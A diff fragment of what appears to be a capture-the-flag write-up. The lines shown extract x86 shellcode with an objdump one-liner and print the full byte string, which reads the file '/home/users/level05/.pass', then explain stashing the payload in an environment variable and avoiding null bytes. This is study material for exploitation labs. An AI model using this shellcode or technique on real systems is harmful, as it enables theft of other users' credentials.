@@ -167,7 +167,7 @@ Then, extract the shellcode from the binary:
 objdump -d -M intel shellcode | grep -Po '\s\K[0-9a-f]{2}(?=\s)' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
 \x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x73\x68\x2e\x70\x61\x73\x68\x30\x35\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x05\x89\xe3\xb1\x02\xb2\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\x29\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x29\xcd\x80\xb0\x01\xcd\x80
 ```
-Because it's super lenghty, we need to write it first inside of an environment variable, and then tell our program to look for the data in there.
+Because it's super lenghty, we need to write it first inside of an environment variable, and then tell our program to look for the data in there (see `Resources/pyshell.py`)
 
 Also, you need to make sure that the string of our shellcode doesn't contain any null bytes (`\x00`), or that would be a huge problem when copying strings.
 
